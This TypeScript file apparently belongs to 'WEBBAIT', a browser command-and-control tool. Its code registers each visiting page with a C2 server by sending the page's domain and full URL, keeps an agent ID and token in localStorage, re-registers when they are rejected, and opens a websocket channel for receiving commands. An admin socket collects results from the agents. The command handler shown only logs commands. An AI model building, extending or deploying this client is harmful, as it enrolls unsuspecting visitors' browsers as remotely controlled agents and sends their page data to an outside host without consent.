import Axios, { AxiosResponse } from "axios";
import { Manager, Socket } from "socket.io-client";
import { AgentCommandResults, AgentCommands } from "../models";

export const websocketManager = new Manager(
  `ws://${process.env.REACT_APP_WS_HOST ? process.env.REACT_APP_WS_HOST : 'localhost'}:${process.env.REACT_APP_WS_PORT ? +process.env.REACT_APP_WS_PORT : 3001}`,
  {
    transports: ['websocket']
  }
);

export let websocketService: Socket | null = null;

export const connectAdminWebsocket = async () => {
  if (websocketService && websocketService.connected) return;
  const token = localStorage.getItem('WEBBAIT_TOKEN');
  if (token) {
    websocketService = websocketManager.socket('/admins', {
      auth: {
        token,
      },
    }).connect();
    websocketService.on('result', async (result: AgentCommandResults) => {
      console.log(result);
    });
    websocketService.on('error', (msg: string) => {
      // if (msg.startsWith('Invalid token')) {
      alert(msg);
      // }
    });
  }
}

export let clientWebsocketService: Socket | null = null;

export const connectClientWebsocket = async () => {
  if (clientWebsocketService && clientWebsocketService.connected) return;
  const agentId = localStorage.getItem('WEBBAIT_CLIENT_AGENT_ID');
  const token = localStorage.getItem('WEBBAIT_CLIENT_TOKEN');
  if (agentId) {
    if (token) {
      clientWebsocketService = websocketManager.socket('/agents/ws', {
        auth: {
          token,
          agentId,
        },
      }).connect();
      clientWebsocketService.on('cmd', (cmd: AgentCommands) => {
        console.log('cmd', cmd);
      });
      clientWebsocketService.on('error', async (msg: string) => {
        if (msg.startsWith('Invalid token')) {
          localStorage.removeItem('WEBBAIT_CLIENT_TOKEN');
          await connectClientWebsocket();
        }
        if (msg.startsWith('Invalid agent id')) {
          localStorage.removeItem('WEBBAIT_CLIENT_AGENT_ID');
          await connectClientWebsocket();
        }
      });
    } else {
      const req = Axios.create({
        baseURL: process.env.REACT_APP_C2_URL ? process.env.REACT_APP_C2_URL : 'http://localhost:3001',
        headers: {
          'x-agent-id': agentId,
        }
      });
      const res: AxiosResponse<{ token: string }> = await req.post('/agents/activity');
      localStorage.setItem('WEBBAIT_CLIENT_TOKEN', res.data.token);
      await connectClientWebsocket();
    }
  } else {
    const req = Axios.create({
      baseURL: process.env.REACT_APP_C2_URL ? process.env.REACT_APP_C2_URL : 'http://localhost:3001',
    });
    const res: AxiosResponse<{ agentId: string, token: string }> = await req.post('/agents', { domain: location.host, url: location.href });
    localStorage.setItem('WEBBAIT_CLIENT_AGENT_ID', res.data.agentId);
    localStorage.setItem('WEBBAIT_CLIENT_TOKEN', res.data.token);
    await connectClientWebsocket();
  }
};
